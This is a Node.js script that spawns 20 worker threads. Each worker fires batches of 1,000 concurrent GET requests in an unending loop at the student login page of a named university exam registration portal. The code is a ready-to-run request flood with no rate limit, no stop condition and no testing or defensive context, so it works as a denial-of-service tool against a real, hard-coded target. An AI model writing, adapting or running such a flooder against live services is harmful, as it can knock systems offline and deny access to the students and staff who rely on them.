const { Worker, isMainThread, parentPort } = require('worker_threads');
const axios = require('axios');
const http = require('http');

// Create an HTTP Agent to reuse TCP connections
const agent = new http.Agent({ keepAlive: true });

const WORKER_COUNT = 20;
const API_CALLS_PER_WORKER = 1000;
const API_URL = 'http://reg.exam.dtu.ac.in/student/login'; // Replace with your actual URL



if (isMainThread) {
  console.log('Main thread: Starting workers...');

  for (let i = 0; i < WORKER_COUNT; i++) {
    const worker = new Worker(__filename);
    worker.on('message', (msg) => {
      console.log(`Worker ${worker.threadId}: ${msg}`);
    });
    worker.on('error', (err) => {
      console.error(`Worker ${worker.threadId} error:`, err);
    });
    worker.on('exit', (code) => {
      if (code !== 0) {
        console.error(`Worker ${worker.threadId} stopped with exit code ${code}`);
      }
    });
  }
} else {
  async function callApiRepeatedly() {
    while (true) {
      const promises = [];
      for (let i = 0; i < API_CALLS_PER_WORKER; i++) {
        promises.push(axios.get(API_URL, { httpAgent: agent }));
      }
      try {
        await Promise.all(promises);
        parentPort.postMessage(`Batch of ${API_CALLS_PER_WORKER} calls successful`);
      } catch (error) {
        parentPort.postMessage(`Batch call failed: ${error.message}`);
      }
    }
  }

  callApiRepeatedly();
}